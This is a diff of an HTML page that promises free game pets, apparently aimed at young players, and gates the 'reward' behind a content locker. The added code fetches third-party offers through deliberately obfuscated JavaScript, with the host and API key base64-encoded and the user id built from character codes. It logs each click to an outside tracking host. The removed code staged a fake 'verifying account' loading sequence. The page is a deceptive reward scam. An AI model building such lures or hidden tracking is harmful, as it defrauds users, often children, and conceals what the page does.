+                    font-size: 1.3rem;
+                    color: white;
+                    font-weight: 700;
+                    text-shadow: 2px 2px 0 #4a2e1f;
+                }
+
+                .close-btn-locker {
+                    position: absolute;
+                    top: 15px;
+                    right: 15px;
+                    background: #ce6f6a;
+                    border: 3px solid #8b3a36;
+                    border-radius: 50%;
+                    width: 35px;
+                    height: 35px;
+                    color: white;
+                    cursor: pointer;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    font-weight: bold;
+                    font-size: 1.2rem;
+                    transition: all 0.3s ease;
+                }
+
+                .close-btn-locker:hover {
+                    background: #b85450;
+                    transform: scale(1.1);
+                }
+
+                .minecraft-offers {
+                    padding: 30px;
+                    background: linear-gradient(180deg, #8B4513 0%, #654321 100%);
+                    min-height: 300px;
+                }
+
+                .minecraft-offers::before {
+                    content: '⚡ Choose any offer to unlock your reward instantly:';
+                    display: block;
+                    font-family: 'Comic Neue', cursive;
+                    font-size: 1.2rem;
+                    font-weight: 700;
+                    color: white;
+                    text-shadow: 2px 2px 0 rgba(0,0,0,0.5);
+                    text-align: center;
+                    margin-bottom: 25px;
+                }
+
+                .minecraft-offers #offerContainer {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+                    gap: 20px;
+                }
+
+                .offer-item {
+                    background: linear-gradient(135deg, #6ee3ef 0%, #35b5ad 100%);
+                    border: 4px solid #1a5a5e;
+                    border-radius: 15px;
+                    padding: 20px;
+                    color: white;
+                    font-family: 'Comic Neue', cursive;
+                    font-size: 1rem;
+                    font-weight: 700;
+                    transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+                    cursor: pointer;
+                    text-align: center;
+                    position: relative;
+                    overflow: hidden;
+                    box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+                }
+
+                .offer-item::before {
+                    content: '';
+                    position: absolute;
+                    top: -3px;
+                    left: -3px;
+                    right: -3px;
+                    bottom: -3px;
+                    background: linear-gradient(45deg, #ffffff, #6ee3ef, #35b5ad, #34888d);
+                    border-radius: 15px;
+                    z-index: -1;
+                    opacity: 0;
+                    transition: opacity 0.4s ease;
+                }
+
+                .offer-item:hover {
+                    transform: translateY(-8px) scale(1.05);
+                    box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+                }
+
+                .offer-item:hover::before {
+                    opacity: 1;
+                }
+
+                .offer-item:active {
+                    transform: translateY(-3px) scale(1.02);
+                }
+
+                .offer-title {
+                    font-size: 1.1rem;
+                    text-shadow: 1px 1px 0 rgba(0,0,0,0.3);
+                    line-height: 1.3;
+                }
+
+                .offer-item::after {
+                    content: '🎁 CLAIM REWARD';
+                    display: block;
+                    margin-top: 10px;
+                    font-size: 0.9rem;
+                    color: #98d952;
+                    font-weight: 900;
+                    text-shadow: 1px 1px 0 rgba(0,0,0,0.5);
+                }
+
+                .minecraft-locker-footer {
+                    background: linear-gradient(180deg, #654321 0%, #4a2e1f 100%);
+                    padding: 20px;
+                    text-align: center;
+                    border-top: 4px solid #4a2e1f;
+                }
+
+                .footer-text {
+                    font-family: 'Comic Neue', cursive;
+                    font-size: 1rem;
+                    color: white;
+                    text-shadow: 1px 1px 0 rgba(0,0,0,0.5);
+                }
+
+                @media (max-width: 768px) {
+                    .tap-rain-modal {
+                        width: 95%;
+                        max-height: 95vh;
+                    }
+
+                    .locker-title {
+                        font-size: 1.8rem;
+                    }
+
+                    .minecraft-offers #offerContainer {
+                        grid-template-columns: 1fr;
+                        gap: 15px;
+                    }
+
+                    .offer-item {
+                        padding: 15px;
+                    }
+                }
+            `;
+
+            modal.appendChild(contentContainer);
+            overlay.appendChild(modal);
+            document.head.appendChild(style);
+            document.body.appendChild(overlay);
+
+            overlay.addEventListener('click', function(e) {
+                if (e.target === overlay) {
+                    document.body.removeChild(overlay);
+                }
+            });
+
+            // ESC key to close
+            const handleEsc = (e) => {
+                if (e.key === 'Escape') {
+                    overlay.remove();
+                    document.removeEventListener('keydown', handleEsc);
+                }
+            };
+            document.addEventListener('keydown', handleEsc);
+
+            if (typeof jQuery === 'undefined') {
+                const script = document.createElement('script');
+                script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js';
+                script.onload = loadOffers;
+                document.head.appendChild(script);
+            } else {
+                loadOffers();
+            }
+
+            function loadOffers() {
+                (function(_0x54af){
+                    var _0x3bfd=function(_0x35c7){return atob(_0x35c7);};
+
+                    var _0x8c4f=_0x3bfd('ZDJqZ2loOXVyeHBhNDcuY2xvdWRmcm9udC5uZXQ=');
+                    var _0x6a1e=_0x3bfd('cHVibGljL29mZmVycy9mZWVkLnBocA==');
+                    var _0x2f5d=String.fromCharCode(55)+String.fromCharCode(48)+
+                        String.fromCharCode(49)+String.fromCharCode(56)+
+                        String.fromCharCode(53)+String.fromCharCode(51);
+                    var _0x9e7b=_0x3bfd('OTFlZTY4NGU4ZGQ3ODg5OGJhMmU3MmE3M2E4YjQyM2U=');
+                    var _0x51fa='67d449d755943ee880d3bb9e';
+                    var _0x7e2c=6; // Show 6 offers for better selection
+
+                    var _0x4c8d=function(_0x354f, _0x52b9, _0x76ae){
+                        var _0x9c4e=new Image();
+                        _0x9c4e.src='https://taprain.com/api/stats/public-track-click?offerId='+
+                            encodeURIComponent(_0x354f)+'&offerName='+encodeURIComponent(_0x52b9)+
+                            '&templateId=custom-modal&userId='+_0x51fa;
+                        setTimeout(function(){window.open(_0x76ae,'_blank');},100);
+                    };
+
+                    _0x54af.getJSON('https://'+_0x8c4f+'/'+_0x6a1e+'?user_id='+_0x2f5d+'&api_key='+_0x9e7b+'&s1='+_0x51fa+'&callback=?',
+                    function(_0x3fc8){
+                        var _0x6d7e='';
+                        _0x3fc8=_0x3fc8.splice(0,_0x7e2c);
+
+                        _0x54af.each(_0x3fc8,function(_0x26ca,_0x4f3b){
+                            _0x6d7e+='<div class="offer-item" data-offer-id="'+(_0x4f3b.id||'unknown')+
+                                '" data-offer-name="'+_0x4f3b.anchor+'" data-offer-url="'+_0x4f3b.url+'">'+
+                                '<div class="offer-title">'+_0x4f3b.anchor+'</div>'+
+                                '</div>';
+                        });
+
+                        _0x54af('#offerContainer').html(_0x6d7e);
+
+                        _0x54af('#offerContainer').on('click','.offer-item',function(_0x2c1d){
+                            _0x2c1d.preventDefault();
+                            var _0x1d4f=_0x54af(this);
+                            var _0x45b2=_0x1d4f.data('offer-id')||'unknown';
+                            var _0x87d6=_0x1d4f.data('offer-name')||_0x1d4f.find('.offer-title').text()||'Unknown Offer';
+                            var _0x32e9=_0x1d4f.data('offer-url');
+                            _0x4c8d(_0x45b2,_0x87d6,_0x32e9);
+                        });
+
+                    }).fail(function(_0x3a5c,_0x4e8d,_0x7c3a){
+                        console.error('Error loading offers:',_0x4e8d);
+                        _0x54af('#offerContainer').html('<div style="text-align: center; color: white; padding: 40px; font-family: \'Comic Neue\', cursive;"><h3>🔄 Loading amazing offers...</h3><p>Please wait while we prepare the best offers for you!</p></div>');
+                    });
+                })(jQuery);
+            }
+        }
 
         // Generate pets grid
         function generatePetsGrid() {
@@ -757,7 +1118,7 @@
             rewards.forEach(pet => {
                 const card = document.createElement('div');
                 card.className = 'pet-card';
-                card.onclick = () => openModal(pet);
+                card.onclick = () => showUsernameModal(pet);
 
                 card.innerHTML = `
                     <img class="pet-image" src="${pet.image}" alt="${pet.name}">
@@ -767,199 +1128,6 @@
 
                 grid.appendChild(card);
             });
-        }
-
-        // Swear word filter
-        const swearWords = ['damn', 'hell', 'crap', 'shit', 'fuck', 'bitch', 'ass', 'piss', 'cock', 'dick', 'noob', 'idiot', 'stupid', 'gay', 'retard', 'kill', 'die', 'hate'];
-
-        // Open modal with excitement building
-        function openModal(pet) {
-            currentPet = pet;
-            document.getElementById('modalTitle').textContent = `${pet.name} Awaits!`;
-            document.getElementById('modalPetImage').src = pet.image;
-            document.getElementById('modalPetImage').alt = pet.name;
-            document.getElementById('modalPetName').textContent = pet.description;
-            document.getElementById('petNameSpan').textContent = pet.name;
-            document.getElementById('petNameSpan2').textContent = pet.name;
-            document.getElementById('petNameSpan3').textContent = pet.name;
-
-            // Reset to step 1
-            resetSteps();
-            document.getElementById('step1').style.display = 'block';
-
-            document.getElementById('modal').style.display = 'flex';
-        }
-
-        // Reset all steps
-        function resetSteps() {
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'none';
-            document.getElementById('step3').style.display = 'none';
-            document.getElementById('step4').style.display = 'none';
-            document.getElementById('usernameError').style.display = 'none';
-            document.getElementById('usernameInput').value = '';
-        }
-
-        // Go to step 2 (username input)
-        function nextStep() {
-            resetSteps();
-            document.getElementById('step2').style.display = 'block';
-        }
-
-        // Validate username and go to step 3
-        function validateUsername() {
-            const username = document.getElementById('usernameInput').value.trim();
-            const errorEl = document.getElementById('usernameError');
-
-            // Check length
-            if (username.length < 3) {
-                errorEl.textContent = 'Username must be at least 3 characters!';
-                errorEl.style.display = 'block';
-                return;
-            }
-
-            // Check for swear words
-            const lowerUsername = username.toLowerCase();
-            for (let swear of swearWords) {
-                if (lowerUsername.includes(swear)) {
-                    errorEl.textContent = 'Please use an appropriate username!';
-                    errorEl.style.display = 'block';
-                    return;
-                }
-            }
-
-            // Username is valid
-            currentUsername = username;
-            errorEl.style.display = 'none';
-
-            // Go to loading step
-            resetSteps();
-            document.getElementById('step3').style.display = 'block';
-            startLoadingSequence();
-        }
-
-        // Fake loading sequence
-        function startLoadingSequence() {
-            const loadingFill = document.getElementById('loadingFill');
-            const loadingText = document.getElementById('loadingText');
-
-            const loadingMessages = [
-                'Connecting to servers...',
-                'Verifying account...',
-                'Preparing reward...',
-                'Almost ready...',
-                'Loading content locker...'
-            ];
-
-            let progress = 0;
-            let messageIndex = 0;
-
-            loadingInterval = setInterval(() => {
-                progress += Math.random() * 15 + 5; // Random progress between 5-20%
-
-                if (progress >= 100) {
-                    progress = 100;
-                    loadingFill.style.width = '100%';
-
-                    setTimeout(() => {
-                        clearInterval(loadingInterval);
-                        showContentLocker();
-                    }, 500);
-                } else {
-                    loadingFill.style.width = progress + '%';
-
-                    // Change loading message occasionally
-                    if (Math.random() > 0.7 && messageIndex < loadingMessages.length - 1) {
-                        messageIndex++;
-                        loadingText.textContent = loadingMessages[messageIndex];
-                    }
-                }
-            }, 400);
-        }
-
-        // Show final content locker step
-        function showContentLocker() {
-            resetSteps();
-            document.getElementById('step4').style.display = 'block';
-            document.getElementById('displayUsername').textContent = currentUsername;
-        }
-
-        // Open the content locker overlay
-        function openOfferWall() {
-            setTimeout(() => {
-                try {
-                    if (typeof _Yf === 'function') {
-                        console.log('Opening content locker overlay with _Yf()');
-                        _Yf(); // This opens the content locker with Minecraft styling applied via CSS
-
-                        // Monitor for content locker appearance and enhance it
-                        const checkForLocker = setInterval(() => {
-                            const locker = document.querySelector('.center1');
-                            if (locker) {
-                                clearInterval(checkForLocker);
-
-                                // Add custom title and description
-                                const step1 = locker.querySelector('#step1-wrapper');
-                                if (step1 && !step1.querySelector('.locker-title')) {
-                                    const title = document.createElement('div');
-                                    title.className = 'locker-title';
-                                    title.style.cssText = `
-                                        font-family: 'Fredoka One', cursive;
-                                        font-size: 2.2rem;
-                                        color: white;
-                                        text-shadow: 3px 3px 0 #4a2e1f;
-                                        margin-bottom: 15px;
-                                    `;
-                                    title.innerHTML = '🔒 Content Locker';
-                                    step1.insertBefore(title, step1.firstChild);
-
-                                    const desc = document.createElement('div');
-                                    desc.className = 'locker-description';
-                                    desc.style.cssText = `
-                                        font-size: 1.2rem;
-                                        color: white;
-                                        font-weight: 700;
-                                        text-shadow: 2px 2px 0 #4a2e1f;
-                                        margin-bottom: 20px;
-                                    `;
-                                    desc.innerHTML = `Complete a quick verification to unlock your ${currentPet ? currentPet.name : 'reward'}!`;
-                                    step1.insertBefore(desc, step1.lastElementChild);
-                                }
-
-                                // Add ESC key to close
-                                const handleEsc = (e) => {
-                                    if (e.key === 'Escape') {
-                                        locker.remove();
-                                        document.removeEventListener('keydown', handleEsc);
-                                    }
-                                };
-                                document.addEventListener('keydown', handleEsc);
-                            }
-                        }, 100);
-
-                        // Stop checking after 10 seconds
-                        setTimeout(() => clearInterval(checkForLocker), 10000);
-
-                    } else {
-                        console.error('Content locker script not loaded properly');
-                        alert('Content locker not available. Please refresh the page and try again.');
-                    }
-                } catch (error) {
-                    console.error('Error opening content locker:', error);
-                    alert('Error loading content locker. Please refresh the page and try again.');
-                }
-            }, 500);
-        }
-
-        // Close modal
-        function closeModal() {
-            document.getElementById('modal').style.display = 'none';
-            if (loadingInterval) {
-                clearInterval(loadingInterval);
-                loadingInterval = null;
-            }
-            resetSteps();
-            currentUsername = '';
         }
 
         // Create sparkle effects
@@ -980,24 +1148,8 @@
         // Initialize the app
         generatePetsGrid();
 
-        // Debug: Check if content locker script loaded
-        setTimeout(() => {
-            if (typeof _Yf === 'function') {
-                console.log('Content locker script loaded successfully');
-            } else {
-                console.log('Content locker script not available - will use fallback');
-            }
-        }, 2000);
-
         // Create sparkles periodically
         setInterval(createSparkle, 800);
-
-        // Handle ESC key to close modal
-        document.addEventListener('keydown', function(event) {
-            if (event.key === 'Escape') {
-                closeModal();
-            }
-        });
     </script>
 </body>
 </html>
